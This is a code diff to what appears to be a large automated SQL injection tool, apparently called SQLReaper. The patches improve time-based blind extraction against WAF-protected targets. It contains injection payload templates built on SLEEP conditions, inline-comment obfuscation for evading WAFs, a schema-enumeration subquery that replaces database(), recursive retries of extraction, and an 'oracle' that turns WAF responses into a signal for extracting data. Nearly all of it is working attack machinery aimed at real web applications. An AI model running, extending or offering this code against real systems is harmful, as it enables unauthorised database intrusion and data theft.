@@ -48632,6 +48632,56 @@ class Enumerator:
                     else:
                         return None
 
+                # BUG-MSE-TF-EBF-BLIND FIX (CRITICAL): The timing fallback oracle used above builds
+                # a STANDARD timing payload (IF/SLEEP, pg_sleep, WAITFOR, etc.) regardless of
+                # whether ExtractionBypassFinder found a working WAF bypass earlier in this session.
+                # On targets where the WAF blocks standard timing payloads (exactly the targets EBF
+                # was designed for), _timing_eval_fn_tf's _build() call produces a WAF-blocked
+                # payload → both true/false probes return False → validation fails → extraction aborts.
+                # Yet _time_based_extract_inner already ran EBF and stored the bypass template in
+                # _TB_EBF_CACHE.  The MSE timing fallback oracle never checks this cache, so it
+                # always falls back to the standard format that the WAF blocks, discarding the EBF
+                # result entirely.
+                # Fix: check _TB_EBF_CACHE before _timing_eval_fn_tf is constructed.  If a cached
+                # EBF bypass exists for this URL+param+sleep combination, redefine
+                # _build_timing_payload_tf to use the EBF template so every subsequent call to
+                # _timing_eval_fn_tf (including the true/false validation probes) uses the
+                # WAF-proven bypass format.  This propagates the EBF bypass directly into the MSE
+                # timing oracle without any additional probes.
+                _ebf_tf_cache_key = f"{_url_tf}:{_det_param_tf}:{_t_sec_tf}"
+                if _ebf_tf_cache_key in _TB_EBF_CACHE:
+                    _ebf_tf_entry   = _TB_EBF_CACHE[_ebf_tf_cache_key]
+                    _ebf_tf_tmpl    = _ebf_tf_entry[0]
+                    _ebf_tf_wrapper = _ebf_tf_entry[2] if len(_ebf_tf_entry) > 2 else "{cond}"
+                    _ebf_tf_tag     = _ebf_tf_entry[3] if len(_ebf_tf_entry) > 3 else ""
+                    if _ebf_tf_tmpl:
+                        LOG.info("[_extract_str] EBF bypass found in cache — wiring into timing "
+                                 "fallback oracle (key=%s tmpl=%.60r wrapper=%r tag=%r)",
+                                 _ebf_tf_cache_key, _ebf_tf_tmpl, _ebf_tf_wrapper, _ebf_tf_tag)
+                        def _build_timing_payload_tf(_cond,
+                                                     _tmpl=_ebf_tf_tmpl,
+                                                     _wrap=_ebf_tf_wrapper,
+                                                     _tag=_ebf_tf_tag):
+                            # EBF bypass template: apply obfuscation + wrapper + template.
+                            # real_tag="" skips obfuscate_cond (no inline-comment splitting
+                            # needed; the template itself carries the obfuscation).
+                            real_tag = "" if (_tag == "nofunc") else _tag
+                            _obf = ExtractionBypassFinder.obfuscate_cond(_cond, real_tag) if real_tag else _cond
+                            _wrapped = _wrap.format(cond=_obf)
+                            return _tmpl.format(cond=_wrapped)
+                        # Also use the EBF-calibrated threshold if available — the default
+                        # `_base_ms_tf + _t_sec_tf * 500` may be too low for WAF-bypass targets
+                        # where the bypass template adds significant extra latency.
+                        _ebf_cal_thresh = _TB_CALIBRATION_CACHE.get(_ebf_tf_cache_key)
+                        if _ebf_cal_thresh and isinstance(_ebf_cal_thresh, (int, float)):
+                            _t_thresh_tf = float(_ebf_cal_thresh)
+                            LOG.info("[_extract_str] Using EBF calibrated threshold=%.0fms "
+                                     "for timing fallback oracle", _t_thresh_tf)
+                        elif isinstance(_ebf_cal_thresh, tuple):
+                            _t_thresh_tf = float(_ebf_cal_thresh[0])
+                            LOG.info("[_extract_str] Using EBF calibrated threshold=%.0fms "
+                                     "(from tuple) for timing fallback oracle", _t_thresh_tf)
+
                 # BUG-TF-OBFUS FIX: Mutable request counter for per-probe obfuscation seed.
                 # Captured as a default arg so the closure holds a single list object
                 # that persists across all calls to _timing_eval_fn_tf.
@@ -55928,9 +55978,14 @@ class Scanner:
             # Fix: explicitly catch CancelledError in the sleep; don't re-raise since
             # it's a deferred cancel artifact, not an intentional extraction stop.
             # BUG-FRESH-V214-4 FIX: also skip CDN wait when origin is known-fast
-            if (not _boolean_oracle and not _cdn_origin_fast_detected and 0 < ms < 220):
-                LOG.info("[Inference] CDN-cached response (%.0fms < 220ms) — "
-                         "waiting 30s for CDN TTL expiry and retrying", ms)
+            # BUG-INFERENCE-CDN-STATUSCHECK FIX (HIGH): add status_code < 400 guard —
+            # WAF block responses (4xx) at sub-220ms latency were misidentified as CDN cache
+            # hits, triggering a 30s sleep when the WAF simply rejected the payload fast.
+            _inf_fp_sc = getattr(fp, 'status_code', 0) or 0
+            if (not _boolean_oracle and not _cdn_origin_fast_detected
+                    and 0 < ms < 220 and _inf_fp_sc < 400):
+                LOG.info("[Inference] CDN-cached response (%.0fms < 220ms, status=%d) — "
+                         "waiting 30s for CDN TTL expiry and retrying", ms, _inf_fp_sc)
                 try:
                     await asyncio.sleep(30.0)
                 except asyncio.CancelledError:
@@ -64322,8 +64377,18 @@ class Scanner:
             t0 = time.monotonic()
             fp = await _send_d(payload)
             ms = (time.monotonic() - t0) * 1000
-            if 0 < ms < 220:
-                LOG.info("[Direct] CDN-cached (%.0fms < 220ms) — waiting 30s", ms)
+            # BUG-DIRECT-CDN-STATUSCHECK FIX (HIGH): Same class of bug as BUG-CAL-CDN-STATUSCHECK
+            # in _calibrate_probe.  The original check `if 0 < ms < 220` had NO status code filter.
+            # WAF challenge/block responses (HTTP 4xx) that happen to be fast (e.g. Imperva returns
+            # HTTP 400/403 in 55-121ms after pattern-matching the payload) were misidentified as
+            # CDN cache hits, triggering a 30s sleep.  After the wait the WAF still blocks → same
+            # 4xx at 81ms → CDN check fires AGAIN on the retry → wasted 60+s per probe pair.
+            # Fix: only treat fast responses as CDN cache hits when status_code < 400 (2xx/3xx).
+            # A fast 4xx is a WAF block, not a CDN hit, and must not trigger the CDN wait.
+            _fp_sc = getattr(fp, 'status_code', 0) or 0
+            if 0 < ms < 220 and _fp_sc < 400:
+                LOG.info("[Direct] CDN-cached (%.0fms < 220ms, status=%d) — waiting 30s",
+                         ms, _fp_sc)
                 try:
                     await asyncio.sleep(30.0)
                 except asyncio.CancelledError:
@@ -64336,6 +64401,9 @@ class Scanner:
                     raise
                 except Exception:
                     pass
+            elif 0 < ms < 220 and _fp_sc >= 400:
+                LOG.debug("[Direct] fast response (%.0fms) but status=%d ≥ 400 — WAF block, "
+                          "NOT CDN cache hit; skipping CDN sleep", ms, _fp_sc)
             return fp, ms
 
         _delay = max(getattr(cfg, "delay", 5.0) or 5.0, 3.0)
@@ -64963,8 +65031,13 @@ class Scanner:
                 if fp is None or ms < 30:
                     return None
                 # CDN reactive retry: same 220ms threshold as _send_d_timed
-                if 0 < ms < 220:
-                    LOG.info("[Direct-bw] CDN-cached (%.0fms < 220ms) — waiting 30s", ms)
+                # BUG-DIRECT-BW-CDN-STATUSCHECK FIX (HIGH): same class of bug as
+                # BUG-DIRECT-CDN-STATUSCHECK and BUG-CAL-CDN-STATUSCHECK — add
+                # status_code < 400 guard to avoid misidentifying WAF blocks as CDN hits.
+                _fp_bw_sc = getattr(fp, 'status_code', 0) or 0
+                if 0 < ms < 220 and _fp_bw_sc < 400:
+                    LOG.info("[Direct-bw] CDN-cached (%.0fms < 220ms, status=%d) — waiting 30s",
+                             ms, _fp_bw_sc)
                     try:
                         await asyncio.sleep(30.0)
                     except asyncio.CancelledError:
@@ -64977,6 +65050,9 @@ class Scanner:
                         raise
                     except Exception:
                         pass
+                elif 0 < ms < 220 and _fp_bw_sc >= 400:
+                    LOG.debug("[Direct-bw] fast response (%.0fms) but status=%d ≥ 400 — "
+                              "WAF block, NOT CDN cache hit; skipping CDN sleep", ms, _fp_bw_sc)
                 if fp is None or ms < 30:
                     return None
                 return ms >= _thresh
@@ -114213,6 +114289,72 @@ class TechniqueCascadeEngine:
                         _combined_canaries.append(_entry)
             _b_fallbacks = _derived_timing + _combined_canaries
         
+        # BUG-PCV-CHECKB-EBF-BLIND FIX (CRITICAL — all WAF-protected timing injection targets):
+        # Check B canary pairs use the standard SLEEP payload format (IF/SLEEP, WAITFOR, etc.)
+        # without any EBF bypass wrapping.  On WAF-protected targets where EBF found a working
+        # bypass template (stored in _TB_EBF_CACHE), ALL standard canary pairs are blocked by
+        # the WAF — producing "FAIL (all fallbacks tried)" even though the WAF-proven bypass
+        # structure is already known.
+        # Root cause: Check B's _b_fallbacks list is built from _derive_timing_payloads,
+        # _hq_bench_canaries, and _b_fallbacks_by_dbms — none of which consult _TB_EBF_CACHE.
+        # Fix: check _TB_EBF_CACHE for any entry matching this url+param combination.  If found,
+        # generate EBF-templated canary pairs and PREPEND them to _b_fallbacks so the
+        # WAF-proven bypass structure is tried first, before the standard (WAF-blocked) canaries.
+        try:
+            _pcv_ebf_url_param_pfx = f"{url}:{param}:"
+            _pcv_ebf_found_entry = None
+            _pcv_ebf_found_key   = None
+            for _pcv_ebf_ek, _pcv_ebf_ev in _TB_EBF_CACHE.items():
+                if _pcv_ebf_ek.startswith(_pcv_ebf_url_param_pfx) and _pcv_ebf_ev and _pcv_ebf_ev[0]:
+                    _pcv_ebf_found_entry = _pcv_ebf_ev
+                    _pcv_ebf_found_key   = _pcv_ebf_ek
+                    break
+            if _pcv_ebf_found_entry:
+                _pcv_ebf_tmpl   = _pcv_ebf_found_entry[0]   # e.g. "' AND (SELECT IF(({cond}),SLEEP(2),0))-- -"
+                _pcv_ebf_wrap   = _pcv_ebf_found_entry[2] if len(_pcv_ebf_found_entry) > 2 else "{cond}"
+                _pcv_ebf_tag    = _pcv_ebf_found_entry[3] if len(_pcv_ebf_found_entry) > 3 else ""
+                _pcv_ebf_nofunc = _pcv_ebf_found_entry[4] if len(_pcv_ebf_found_entry) > 4 else False
+                # Choose conditions based on nofunc: nofunc means WAF blocks SUBSTRING/ORD,
+                # so use arithmetic tautology/contradiction conditions instead.
+                _substr_pcv = "SUBSTR" if (dbms or "").lower() in ("oracle", "sqlite") else "SUBSTRING"
+                if _pcv_ebf_nofunc:
+                    _pcv_ebf_cond_pairs = [
+                        ("7*13=91", "7*13=92", "EBF-bypass(arithmetic-nofunc)"),
+                    ]
+                else:
+                    _pcv_ebf_cond_pairs = [
+                        (f"{_substr_pcv}('SQLReaper',1,1)='S'",
+                         f"{_substr_pcv}('SQLReaper',1,1)='X'",
+                         "EBF-bypass(SUBSTRING)"),
+                        ("7*13=91", "7*13=92", "EBF-bypass(arithmetic)"),
+                    ]
+                _pcv_ebf_canaries = []
+                for _pcv_ec_t, _pcv_ec_f, _pcv_ec_name in _pcv_ebf_cond_pairs:
+                    try:
+                        # obfuscate_cond: splits function names with inline comments.
+                        # For nofunc tag, skip obfuscation (no function names to split).
+                        _pcv_real_tag = "" if (_pcv_ebf_tag == "nofunc") else _pcv_ebf_tag
+                        _pcv_obf_t = (ExtractionBypassFinder.obfuscate_cond(_pcv_ec_t, _pcv_real_tag)
+                                      if _pcv_real_tag else _pcv_ec_t)
+                        _pcv_obf_f = (ExtractionBypassFinder.obfuscate_cond(_pcv_ec_f, _pcv_real_tag)
+                                      if _pcv_real_tag else _pcv_ec_f)
+                        _pcv_wrapped_t = _pcv_ebf_wrap.format(cond=_pcv_obf_t)
+                        _pcv_wrapped_f = _pcv_ebf_wrap.format(cond=_pcv_obf_f)
+                        _pcv_pay_t = _pcv_ebf_tmpl.format(cond=_pcv_wrapped_t)
+                        _pcv_pay_f = _pcv_ebf_tmpl.format(cond=_pcv_wrapped_f)
+                        if _pcv_pay_t and _pcv_pay_f and _pcv_pay_t != _pcv_pay_f:
+                            _pcv_ebf_canaries.append((_pcv_pay_t, _pcv_pay_f, _pcv_ec_name))
+                    except Exception:
+                        pass
+                if _pcv_ebf_canaries:
+                    LOG.info("[PCV CheckB] EBF bypass found (key=%s, tag=%r, nofunc=%s) — "
+                             "prepending %d EBF-templated canary pairs to _b_fallbacks",
+                             _pcv_ebf_found_key, _pcv_ebf_tag, _pcv_ebf_nofunc,
+                             len(_pcv_ebf_canaries))
+                    _b_fallbacks = _pcv_ebf_canaries + _b_fallbacks
+        except Exception as _pcv_ebf_scan_e:
+            LOG.debug(f"[PCV CheckB] EBF cache scan error (non-fatal): {_pcv_ebf_scan_e}")
+
         _b_pass = False
         _b_method = ""
         _b_true_ms = 0.0
@@ -142623,7 +142765,24 @@ class ExtractionBypassFinder:
                 #     the same condition without the EXISTS gate is blocked.
                 # If either test passes → upgrade _working_tag/wrapper → _nofunc=False
                 # → full ASCII binary-search extraction becomes available.
-                if _working_tag == "nofunc":
+                #
+                # BUG-EBF-P2-CATALOG-NOFUNC-SKIP FIX (CRITICAL): Phase 2.5 was gated on
+                # `_working_tag == "nofunc"`.  When Phase 2 confirmed a bypass via the
+                # catalog subquery `(SELECT 1 FROM information_schema.tables LIMIT 1) IS
+                # NOT NULL` (tag=""), _working_tag="" and Phase 2.5 was NEVER entered.
+                # Consequence: EBF reported nofunc=False (full function extraction), but
+                # the WAF blocks ORD/SUBSTRING during actual extraction → all binary-search
+                # probes return fast (WAF block, no sleep) → oracle always False → lo=0 for
+                # every character → empty string.  After one failed extraction, the cache
+                # upgrades to nofunc=True, wasting an entire extraction round and N×32
+                # HTTP probes.  The confirmed bypass WORKS for the catalog subquery but NOT
+                # for extraction-style function calls — that distinction must be tested here.
+                # Fix: run Phase 2.5 when _working_tag == "" (catalog subquery bypass) too.
+                # If ORD/SUBSTRING pass → _nofunc stays False (correct).
+                # If ORD/SUBSTRING are WAF-blocked → set _nofunc=True IMMEDIATELY here,
+                # so the first extraction call uses prefix comparison without wasted round.
+                _force_nofunc = False  # set True if Phase 2.5 confirms ORD/SUBSTRING blocked
+                if _working_tag in ("nofunc", ""):
                     _fc_probe_dbms = {
                         "MySQL":       "ORD(SUBSTRING('A',1,1))>64",
                         "MariaDB":     "ORD(SUBSTRING('A',1,1))>64",
@@ -142742,10 +142901,20 @@ class ExtractionBypassFinder:
                                   f"wrapper={_upg_wrap!r} blocked "
                                   f"({_ep25s:.0f}ms≤{thresh:.0f}ms)",
                                   flush=True)
-                    if _working_tag == "nofunc":
-                        print("[-] [EBF] p2.5 exhausted: no func-call bypass found"
-                              "  maintaining nofunc prefix-comparison mode",
-                              flush=True)
+                    if not _p25_done:
+                        if _working_tag == "nofunc":
+                            print("[-] [EBF] p2.5 exhausted: no func-call bypass found"
+                                  "  maintaining nofunc prefix-comparison mode",
+                                  flush=True)
+                        else:
+                            # _working_tag == "" (catalog-subquery bypass): Phase 2 confirmed
+                            # the bypass template works, but every ORD/SUBSTRING probe was
+                            # WAF-blocked.  Force nofunc so the extraction caller immediately
+                            # uses prefix comparison instead of wasting a full extraction round.
+                            print("[-] [EBF] p2.5 exhausted: ORD/SUBSTRING WAF-blocked under"
+                                  " catalog bypass — forcing nofunc prefix-comparison mode",
+                                  flush=True)
+                            _force_nofunc = True
 
                 #  Build extraction callable
                 print(f"[+] [EBF] bypass found: tmpl={tmpl[:60]!r} "
@@ -142758,7 +142927,7 @@ class ExtractionBypassFinder:
                 _st      = self.t
                 _wrapper = _working_wrapper
                 _tag     = _working_tag
-                _nofunc  = (_working_tag == "nofunc")
+                _nofunc  = (_working_tag == "nofunc") or _force_nofunc
 
                 def _extraction_payload(condition: str) -> str:
                     """Apply obfuscation, wrapper, and template to extraction cond."""
@@ -143487,17 +143656,34 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             _cal_hdrs = {"Cache-Control": "no-cache, no-store", "Pragma": "no-cache",
                          "Accept-Language": f"en-US,en;q=0.{_cb_cal % 9000 + 1000}"}
             t0 = time.monotonic()
+            _fp_cal = None
             try:
-                await _send_injected(engine, method, _cal_url, data, data_fmt,
+                _fp_cal = await _send_injected(engine, method, _cal_url, data, data_fmt,
                                       result.param if hasattr(result, "param") else "",
                                       original + payload, tc,
                                       extra_headers=_cal_hdrs, _bypass_mutation=True)
             except Exception as _ce:
                 LOG.debug("[TBExtract] calibration probe error: %s", _ce)
             ms = (time.monotonic() - t0) * 1000
-            # CDN reactive retry: if CDN-warm (<220ms), wait 30s for TTL expiry
-            if 0 < ms < 220:
-                LOG.info("[TBExtract] CDN-cached calibration (%.0fms) — waiting 30s", ms)
+            # BUG-CAL-CDN-STATUSCHECK FIX (HIGH): The original CDN check used
+            # `if 0 < ms < 220` with NO status code check.  WAF challenge pages and
+            # block responses (4xx) that happen to be fast (e.g. Imperva/Cloudflare
+            # returning HTTP 400/403 in 55-121ms) were misidentified as CDN cache hits.
+            # Consequences:
+            #   1. 30-second sleep injected for every calibration probe — for a target
+            #      where WAF blocks ALL SQL payloads, ALL calibration strategies sleep
+            #      30s each, stretching calibration from seconds to many minutes.
+            #   2. After the 30s sleep the WAF still blocks; ms is still <220 but now
+            #      4xx; _cal_hit() sees a fast sub-baseline ms and records a failed
+            #      calibration — same as if we'd skipped the CDN wait entirely, wasting
+            #      30s per probe with no benefit.
+            # Fix: only treat fast responses as CDN cache hits when status_code < 400
+            # (2xx/3xx responses). A sub-220ms response with status >= 400 is a WAF
+            # block, not a CDN cache hit, and must not trigger the 30s wait.
+            _fp_cal_sc = getattr(_fp_cal, 'status_code', 0) or 0
+            if 0 < ms < 220 and _fp_cal_sc < 400:  # CDN cache hit: fast 2xx/3xx response
+                LOG.info("[TBExtract] CDN-cached calibration (%.0fms status=%d) — waiting 30s",
+                         ms, _fp_cal_sc)
                 try:
                     await asyncio.sleep(30.0)
                 except asyncio.CancelledError:
@@ -143516,6 +143702,9 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 except Exception:
                     pass
                 ms = (time.monotonic() - t0) * 1000
+            elif 0 < ms < 220 and _fp_cal_sc >= 400:
+                LOG.debug("[TBExtract] fast calibration (%.0fms) but status=%d ≥ 400 — "
+                          "WAF block, NOT CDN cache hit; skipping CDN sleep", ms, _fp_cal_sc)
             return ms
 
         def _cal_hit(ms: float) -> bool:
@@ -143830,16 +144019,45 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         # BUG-D FIX: @@dbname and @@current_user are NOT valid MySQL system variables
         # (MySQL raises "Unknown system variable" for both). Use keyword expressions
         # current_user and user (no parentheses) which are valid in MySQL SELECT context.
-        # database() has no parenthesis-free equivalent in MySQL so it is removed from
-        # the remap table to prevent silent SQL errors in nofunc mode.
+        #
+        # BUG-NOFUNC-MYSQL-DATABASE FIX (HIGH): database() has no keyword-only equivalent
+        # in MySQL — @@database does not exist, and DATABASE() requires parentheses which
+        # trigger the `_has_func_calls` regex guard.  The old code omitted database() from
+        # the remap, causing the obfusc-split fallback to fire: database() →
+        # dat/*!34273*/abase().  But ORD/SUBSTRING are still blocked by WAFs in nofunc mode,
+        # so the obfuscated form's binary-search conditions (ORD(SUBSTRING(...))) are
+        # blocked regardless → empty string returned for every database() extraction.
+        # Fix: remap database() to a pure-subquery form with no function calls:
+        #   (SELECT table_schema FROM information_schema.tables WHERE
+        #    table_schema != 'information_schema' AND table_schema != 'performance_schema'
+        #    AND table_schema != 'mysql' AND table_schema != 'sys'
+        #    ORDER BY 1 LIMIT 1)
+        # This subquery contains no `\w+\s*\(` patterns (no function calls), so
+        # `_has_func_calls = False` → `_can_nofunc_extract = True` → prefix comparison
+        # via 0x{hex} literals is used, which WAFs do not block.
+        # Caveat: returns the alphabetically-first non-system schema owned by the DB user.
+        # For the vast majority of web applications this is the application database.
+        # The caller treats empty result as "unknown" and continues with schema enumeration.
         "MySQL": {
             "version()":          "@@version",
             "current_user()":     "current_user",
             "user()":             "user",
+            "database()":         ("(SELECT table_schema FROM information_schema.tables"
+                                   " WHERE table_schema != 'information_schema'"
+                                   " AND table_schema != 'performance_schema'"
+                                   " AND table_schema != 'mysql'"
+                                   " AND table_schema != 'sys'"
+                                   " ORDER BY 1 LIMIT 1)"),
         },
         "MariaDB": {
             "version()":          "@@version",
             "current_user()":     "current_user",
+            "database()":         ("(SELECT table_schema FROM information_schema.tables"
+                                   " WHERE table_schema != 'information_schema'"
+                                   " AND table_schema != 'performance_schema'"
+                                   " AND table_schema != 'mysql'"
+                                   " AND table_schema != 'sys'"
+                                   " ORDER BY 1 LIMIT 1)"),
         },
         "MSSQL": {
             # db_name() and user_name() have no valid nofunc form in MSSQL;
@@ -144578,6 +144796,22 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                          "(ORD/SUBSTRING WAF-blocked; prefix comparison will be used next)")
                 print("[+] [TBExtract] EBF bypass upgraded to nofunc=True "
                       "(WAF blocks ORD/SUBSTRING; switching to prefix comparison)", flush=True)
+                # BUG-NOFUNC-GARBAGE-NORETRY FIX (CRITICAL): Same issue as BUG-NOFUNC-EMPTY-NORETRY
+                # — after upgrading the cache the old code fell through to `if not result_str:`
+                # which would see nofunc=True in the cache and DELETE it (the condition at
+                # `not _cur_ebf_entry[4]` is False when nofunc=True → else: delete).
+                # This silently undid the garbage-guard Case A upgrade every time.
+                # Fix: immediately retry with the upgraded nofunc=True cache (same as the
+                # empty-result Case A fix below) and return, preventing the empty handler from
+                # reaching and deleting the newly-upgraded entry.
+                print("[+] [TBExtract] Retrying extraction with nofunc=True after garbage detection",
+                      flush=True)
+                if _ext_delay is not None:
+                    config.delay = _orig_delay
+                _gc_nofunc_result = await _time_based_extract_inner(
+                    engine, config, result, sql,
+                    method, url, data, data_fmt, original, tamper_chain, dbms, baseline)
+                return _gc_nofunc_result
             else:
                 # Case B: Standard calibration or EBF already nofunc=True → threshold issue.
                 # Clear both caches so next call performs full re-calibration + EBF re-run.
@@ -144623,6 +144857,27 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 print("[+] [TBExtract] EBF bypass upgraded to nofunc=True on empty result "
                       "(WAF blocks ORD/SUBSTRING extraction conditions; switching to prefix comparison)",
                       flush=True)
+                # BUG-NOFUNC-EMPTY-NORETRY FIX (CRITICAL): After upgrading the EBF cache to
+                # nofunc=True, the old code returned "" immediately and left extraction to the
+                # caller's fallback chain (typically MSE/Orchestrator). The caller then invokes
+                # MSE which sets up its own timing oracle WITHOUT the EBF bypass template,
+                # causing the oracle to fail validation and return "" for all fields.
+                # Fix: immediately retry extraction within the same call stack using the updated
+                # nofunc=True cache.  The recursive call hits the calibration cache (preserving
+                # the threshold) and the EBF cache (now nofunc=True), uses prefix string
+                # comparison instead of ORD/SUBSTRING binary search, and returns real data.
+                # Safety: the recursive call has nofunc=True → the empty handler branch
+                # `if _cal_key in _TB_EBF_CACHE and _ebf_mode[0] and not _ebf_nofunc_ref[0]:`
+                # is False when nofunc=True, so recursion is bounded to ONE extra call.
+                print("[+] [TBExtract] Retrying extraction with nofunc=True (prefix comparison mode)",
+                      flush=True)
+                # Restore delay before recursing so the recursive call gets a clean config state.
+                if _ext_delay is not None:
+                    config.delay = _orig_delay
+                _nofunc_retry_result = await _time_based_extract_inner(
+                    engine, config, result, sql,
+                    method, url, data, data_fmt, original, tamper_chain, dbms, baseline)
+                return _nofunc_retry_result
             else:
                 # nofunc already True or no EBF entry — cache is stale, force re-calibration
                 LOG.info("[TBExtract] EBF cache invalidated (empty result with nofunc=False bypass, no nofunc upgrade possible)")
@@ -156669,28 +156924,48 @@ class WAFWeaponizationOracle:
             "Informix":        "(1e0 IS NULL)",
             "SAP_HANA":        "(1e0 IS NULL)",
         }.get(dbms or '', "1e0 IS NULL")
-        # Send clean baseline
-        print("[+] [Novel-1] Sending clean baseline probe...")
-        fp_clean, _ = await send_fn(_ww_true_cond)
-        clean_status = getattr(fp_clean, "status_code", 0)
-        await asyncio.sleep(delay)
 
+        # BUG-WWO-BASELINE-TEMPLATE FIX (CRITICAL): The previous calibration sent
+        # _ww_true_cond as a RAW condition (no WAF trigger in the SQL text) as its
+        # clean baseline, then compared it against build_payload(_ww_false_cond, …)
+        # which embeds 'javascript:alert(1)' (or similar) in the ELSE arm. These
+        # two payloads have fundamentally different SQL structures, so the WAF may
+        # respond differently due to STRUCTURE differences, not because the oracle
+        # correctly distinguishes true vs false *conditions*.  During extraction all
+        # probes use build_payload(cond, …) — the ELSE trigger text is ALWAYS present
+        # in the SQL.  A REQUEST-level WAF that fires on the trigger text in the
+        # request body returns the SAME status (false_status) for EVERY extraction
+        # probe regardless of whether the DB condition is true or false, making the
+        # oracle non-functional (always-false) or degenerate (garbage via rule priority).
+        #
+        # Fix: test EACH trigger with build_payload for BOTH the true and false arms,
+        # using the exact same SQL template structure as extraction will use.
+        # If both arms produce the same WAF response, the oracle is NOT viable (WAF
+        # responds to the template structure, not the condition value).  Only when the
+        # true arm and false arm produce different responses is the oracle real
+        # (WAF inspects what the SQL outputs, i.e. response-level inspection).
         for idx, trigger in enumerate(cls.WAF_TRIGGERS):
             print("[+] [Novel-1] Testing WAF trigger %d/%d: %s..." % (idx+1, len(cls.WAF_TRIGGERS), trigger[:30]))
-            # Build FALSE condition that outputs the trigger
-            payload = cls.build_payload(_ww_false_cond, dbms, idx)
-            fp_trig, _ = await send_fn(payload)
-            trig_status = getattr(fp_trig, "status_code", 0)
+            # TRUE arm: condition is true → DB outputs '1' (no trigger in SQL output)
+            true_payload  = cls.build_payload(_ww_true_cond, dbms, idx)
+            fp_true, _    = await send_fn(true_payload)
+            true_status   = getattr(fp_true, "status_code", 0)
+            await asyncio.sleep(delay * 0.5)
+            # FALSE arm: condition is false → DB outputs trigger text
+            false_payload = cls.build_payload(_ww_false_cond, dbms, idx)
+            fp_false, _   = await send_fn(false_payload)
+            false_status  = getattr(fp_false, "status_code", 0)
             await asyncio.sleep(delay)
 
-            if trig_status != clean_status:
-                return idx, clean_status, trig_status  # Found a working trigger!
+            if true_status != false_status:
+                return idx, true_status, false_status  # Found a working trigger!
 
-            # Also check content length difference
-            clean_len = getattr(fp_clean, "content_length", 0)
-            trig_len = getattr(fp_trig, "content_length", 0)
-            if abs(clean_len - trig_len) > 20:
-                return idx, clean_status, trig_status
+            # Also check content length difference (response-level WAF may differ in body size)
+            true_len  = getattr(fp_true,  "content_length", 0)
+            false_len = getattr(fp_false, "content_length", 0)
+            if abs((true_len or 0) - (false_len or 0)) > 20:
+                # Return with status codes as measured — caller checks true_status != false_status
+                return idx, true_status, false_status
 
         return None  # No trigger works
 
